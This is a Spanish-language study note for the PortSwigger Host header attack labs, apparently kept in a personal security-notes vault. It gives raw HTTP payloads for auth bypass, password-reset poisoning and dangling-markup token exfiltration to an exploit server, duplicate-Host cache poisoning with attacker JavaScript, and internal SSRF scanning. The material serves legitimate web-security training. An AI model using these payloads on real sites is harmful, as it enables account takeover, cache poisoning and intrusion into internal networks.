---
aliases:
  - HTTP Host header labs
  - host-header-labs
tags:
  - vuln/host-header
  - labs
  - portswigger
---

# HTTP Host header attacks — Labs de PortSwigger

Labs de la categoría **[HTTP Host header attacks](https://portswigger.net/web-security/host-header)**: **6 Practitioner + 1 Expert** (7 en total, **sin Apprentice**). **El hilo común:** la app **confía en el header `Host`** (o en `X-Forwarded-Host`) —que vos controlás por completo— y lo usa para algo sensible: **construir una URL absoluta** (link de reseteo de contraseña, `<script src>` reflejado), **tomar una decisión de autorización** (`/admin` "solo para locales") o **rutear la petición** a un back-end. Vos cambiás ese valor y rompés la suposición. Lo que cambia lab a lab: **para qué usa el Host** la app y **qué validación** tenés que esquivar (nada → header alternativo → Host duplicado → URL absoluta en la request line → validación solo en la 1ª request de la conexión).

> [!note] Tres "sabores" de Host header attack
> - **Reflejado en contenido** (password reset, cache poisoning): el Host termina dentro de un email o de una respuesta cacheada → lo apuntás a **tu** servidor para robar tokens o envenenar la caché. Labs 1, 2, 3, 4.
> - **Decisión de acceso**: el server autoriza según el Host (`Host: localhost` = "sos interno") → lo falseás y entrás. Lab 5 (auth bypass).
> - **Routing / SSRF**: un front-end **rutea** según el Host → lo mandás a una IP interna. Ciego → **Collaborator** para confirmar. Labs 6, 7 y el Expert.

> **Cómo leer las columnas:** **Para qué usa el Host** = por qué el header es peligroso en ese lab · **Técnica · qué necesitás** = cómo lo manipulás + herramientas externas (exploit server / Collaborator / Intruder) · **Objetivo** = qué conseguís. Payloads completos → sección [Payloads por lab](#payloads-por-lab).

## Practitioner

| # | Laboratorio | Para qué usa el Host (superficie) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 1 | [Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass) | **Autorización:** `/admin` solo para "usuarios locales" según el `Host` | **Falsear el Host:** `Host: localhost` hace que el server te trate como interno. Nada externo. | Entrar a `/admin` con `Host: localhost` → **borrar a `carlos`**. |
| 2 | [Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning) | **URL absoluta en email:** el link de reseteo se arma con el `Host` | **Envenenar el reset:** pedís reset de `carlos` con `Host: TU-EXPLOIT-SERVER`. El link (con el token) apunta a tu server; cuando "carlos" lo abre, su token cae en tu **access log**. Necesitás **exploit server**. | Robar el token de `carlos` → cambiarle la contraseña → **entrar como carlos**. |
| 3 | [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-password-reset-poisoning-via-dangling-markup) | **Email HTML:** el `Host` se refleja dentro del HTML del mail | **Dangling markup:** el Host no se puede desviar entero, pero inyectás `'><img src="//TU-EXPLOIT-SERVER/?` en el header → el `<img>` sin cerrar "se traga" el HTML siguiente (incluido el token) y lo manda a tu server. Necesitás **exploit server**. | Filtrar el token de `carlos` por dangling markup → **entrar como carlos** y borrar su cuenta. |
| 4 | [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests) | **`<script src>` reflejado:** la home refleja el `Host` en la URL absoluta de un JS de tracking | **Host duplicado (request ambigua):** mandás **dos** headers `Host`; la caché **clavea** con el primero (el real) y el back-end **refleja** el segundo (el tuyo). Servís un JS malicioso desde tu **exploit server** → queda cacheado para todos. | Envenenar la caché para que la home importe tu script → **ejecución en el navegador de la víctima** (`alert(document.cookie)`). |
| 5 | [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf) | **Routing:** un front-end **rutea** la petición según el `Host` | **SSRF por routing (ciego):** primero ponés tu subdominio de **Collaborator** en el `Host` y confirmás la interacción. Después escaneás `192.168.0.X` en el `Host` con **Intruder** hasta pegar en el admin interno. | Rutear al panel interno en **`192.168.0.X`** → `/admin` → **borrar a `carlos`**. |
| 6 | [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing) | **Routing:** el front-end **valida** el `Host` pero rutea por la **URL de la request line** | **URL absoluta + Host válido:** poné la IP interna en la **request line** (`GET https://192.168.0.X:8080/admin HTTP/1.1`) y dejá el `Host` **legítimo** para pasar la validación. El front-end rutea por la URL absoluta. Confirmás con **Collaborator** + **Intruder**. | Rutear al admin interno esquivando la validación → **borrar a `carlos`**. |

## Expert

| # | Laboratorio | Para qué usa el Host (superficie) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 7 | [Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack) | **Routing:** el server **valida el `Host` solo en la 1ª request** de cada conexión TCP | **Connection-state attack:** mandás **2 requests en la misma conexión**: la 1ª válida (pasa la validación), la 2ª con `Host: 192.168.0.1` interno (ya no se re-valida). En Repeater: **"Send group in sequence (single connection)"**. Confirmás con **Collaborator**. | Rutear al admin interno reusando la conexión validada → **borrar a `carlos`**. |

---

## Payloads por lab

> El header `Host` se edita en Burp Repeater (o Proxy). Si `Host` está validado, probá los **headers alternativos** (`X-Forwarded-Host`, ver [atajos](#atajos-mentales--patrones)). Reemplazá `LAB-ID`, `TU-EXPLOIT-SERVER` y `COLLAB` por lo tuyo. El **borrado de carlos** suele ser `GET /admin/delete?username=carlos` (o el botón "Delete" del panel).

**L1 — Auth bypass (Host: localhost):**
```
GET /admin HTTP/1.1
Host: localhost
```
```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```
> Si `/admin` con `Host: localhost` no anda directo, probá el header alternativo: `X-Forwarded-Host: localhost` (a veces la app confía en ese en vez de en `Host`).

**L2 — Password reset poisoning básico (Host → exploit server):**
```
POST /forgot-password HTTP/1.1
Host: TU-EXPLOIT-SERVER.exploit-server.net

username=carlos
```
> Después revisá el **access log** de tu exploit server: vas a ver `GET /forgot-password?temp-forgot-password-token=XXXXX`. Usás ese token: `GET /forgot-password?temp-forgot-password-token=XXXXX` en el lab → ponés contraseña nueva → entrás como `carlos`.

**L3 — Password reset poisoning por dangling markup:**
```
POST /forgot-password HTTP/1.1
Host: LAB-ID.web-security-academy.net:'><img src="//TU-EXPLOIT-SERVER.exploit-server.net/?

username=carlos
```
> El email HTML queda `...href='https://LAB-ID...:'><img src="//TU-EXPLOIT-SERVER/?...TOKEN...` → el `<img>` sin comilla de cierre exfiltra todo lo que sigue (incluido el token) a tu server. Leé el **access log**, sacá el token, reseteá la pass de `carlos`, entrá y borrá su cuenta.

**L4 — Cache poisoning con Host duplicado (request ambigua):**
```
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Host: TU-EXPLOIT-SERVER.exploit-server.net
```
> La respuesta refleja el 2º `Host` en `<script src="//TU-EXPLOIT-SERVER/resources/js/tracking.js">`. En el exploit server serví ese path con:
> ```
> alert(document.cookie)
> ```
> Reenviá hasta que la respuesta salga **cacheada** (`X-Cache: hit`). Cuando la víctima carga la home, ejecuta tu JS.

**L5 — Routing-based SSRF (Host → interno):**
```
GET / HTTP/1.1
Host: TU-SUBDOMINIO.COLLAB          ← paso 1: confirmar (Poll now en Collaborator)
```
```
GET /admin HTTP/1.1
Host: 192.168.0.0                    ← paso 2: Intruder sobre el último octeto (0-255)
```
```
GET /admin/delete?username=carlos HTTP/1.1
Host: 192.168.0.X                    ← con la IP que dio 200
```

**L6 — SSRF por parsing (URL absoluta + Host válido):**
```
GET https://TU-SUBDOMINIO.COLLAB/ HTTP/1.1     ← paso 1: confirmar por Collaborator
Host: LAB-ID.web-security-academy.net
```
```
GET https://192.168.0.0:8080/admin HTTP/1.1    ← paso 2: Intruder sobre el octeto en la request line
Host: LAB-ID.web-security-academy.net
```
> El front-end **rutea por la URL absoluta** de la request line, pero **valida el header `Host`** → por eso el `Host` queda legítimo y la URL apunta adentro. Con la IP correcta: `GET https://192.168.0.X:8080/admin/delete?username=carlos`.

**L7 — Connection-state attack (2 requests, 1 conexión):**
```
# Request 1 (válida — pasa la validación)
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net

# Request 2 (misma conexión — ya no se re-valida el Host)
GET /admin HTTP/1.1
Host: 192.168.0.1
```
> En Repeater: seleccioná las 2 pestañas → **"Send group in sequence (single connection)"**. Confirmá primero con Collaborator en el `Host` de la 2ª request. Después `/admin/delete?username=carlos` en la 2ª.
>
> 🐍 **Script que resuelve este lab entero** (sin Burp, sobre un solo socket) → [[vulnerabilities/016-host-header-injection/scripts/conn_reuse.py|scripts/conn_reuse.py]]. Manda las **3** peticiones por la misma conexión keep-alive (`/` → `/admin` en `192.168.0.1` → `POST /admin/delete`), **arrastra la cookie de sesión** de la 1ª respuesta (sin ella la 2ª da `421 Misdirected Request / Invalid host`) y **captura el `csrf`** para el borrado. Editás `HOST` y corrés `python conn_reuse.py`.

---

## Atajos mentales / patrones

- **La pista de que hay Host header attack:** la app **te devuelve** el valor del Host en algún lado (un email, un `<link>`/`<script>` absoluto, un redirect `302 Location`) **o** lo usa para decidir acceso/routing. Regla base: **cambiá el `Host` y observá** — ¿se refleja?, ¿cambia la autorización?, ¿la petición viaja a otro lado?
- **Si `Host` está validado, probá headers alternativos** (muchas apps confían en el "primero que encuentran"):
  - `X-Forwarded-Host` (el más común) · `X-Host` · `X-Forwarded-Server` · `X-HTTP-Host-Override` · `Forwarded: host=...`
  - **Host duplicado** (dos headers `Host`) — caché y back-end lo parsean distinto (L4).
  - **Indentar/wrappear** el header (` Host:` con espacio, o inyección de línea) para colar un segundo valor.
  - **Puerto arbitrario** o basura en el puerto (`Host: real:BADSTUFF`) cuando solo validan el hostname (base del dangling markup, L3).
- **Reflejado → robá o envená:**
  - **Email** (password reset): apuntá el `Host` a tu **exploit server** y leé el token en el access log (L2); si no controlás la URL entera, **dangling markup** para exfiltrar el token (L3).
  - **Respuesta cacheada**: si el reflejo queda **fuera de la cache key**, envenenás la caché para todos → ver [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|web cache poisoning]] (L4).
- **Decisión de acceso:** `Host: localhost` / `127.0.0.1` / `X-Forwarded-Host: localhost` para hacerte pasar por request interna y abrir `/admin` (L1).
- **Routing / SSRF:** si un front-end rutea por el `Host`, mandalo a `192.168.0.X`. Es **ciego** → **Collaborator** para confirmar, **Intruder** para escanear la /24. Escalera de dificultad: routing directo (L5) → **URL absoluta** en la request line con Host válido (L6) → **connection-state** (validan solo la 1ª request de la conexión, L7). Emparenta con [[vulnerabilities/007-ssrf/ssrf|SSRF]] clásico.
- **Borrar carlos:** casi todos terminan en `/admin/delete?username=carlos` una vez que llegás al panel — acordate de **agregar la ruta de borrado** después de confirmar el acceso.

> [!note] Ver también
> - **SSRF** (routing-based es un SSRF por el Host) → [[vulnerabilities/007-ssrf/ssrf|ssrf]]
> - **Web cache poisoning** (el reflejo del Host cacheado; ya tenés ejemplos con `X-Forwarded-Host`) → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|web cache poisoning]] · [[vulnerabilities/030-web-cache-poisoning/examples/004-host-header-injection-redirect|ejemplo 004]]
> - **Password reset poisoning** = toma de cuenta → relación con [[vulnerabilities/029-authentication/authentication|authentication]]
> - **Auth bypass por `Host: localhost`** = control de acceso roto → [[vulnerabilities/028-access-control/access-control|access control]]
